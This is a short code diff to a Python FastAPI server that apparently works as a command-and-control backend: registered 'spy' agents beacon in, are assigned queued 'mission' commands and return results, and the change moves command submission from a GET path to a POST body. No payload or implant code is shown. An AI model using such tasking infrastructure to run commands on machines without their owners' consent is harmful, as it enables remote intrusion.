@@ -17,10 +17,16 @@ class RegisterRequest(BaseModel):
 class BeaconRequest(BaseModel):
     id: int
     active: bool
+    
+class MissionRequest(BaseModel):
+    command: str
 
 class ResultRequest(BaseModel):
     command: str
     result: str
+    
+
+
 
 
 class Spy:
@@ -101,13 +107,13 @@ async def clean_output(spy_id: int):
         return {"message": "Output cleared"}
     raise HTTPException(status_code=404, detail="Spy not found")
 
-@app.get("/mission/{spy_id}/{command}")
-async def receive_mission(spy_id: int, command: str):
+@app.post("/mission/{spy_id}")
+async def receive_mission(spy_id: int, request: MissionRequest):
     spy = next((s for s in spies if s.id == spy_id), None)
     if spy:
         if spy.mission is not None:
             return {"message": "The mission queue is full, please wait for the execution of current mission"}
-        spy.mission = command
+        spy.mission = request.command
         return {"message": f"Mission updated for spy {spy.guid}"}
     raise HTTPException(status_code=404, detail="Spy not found")
 
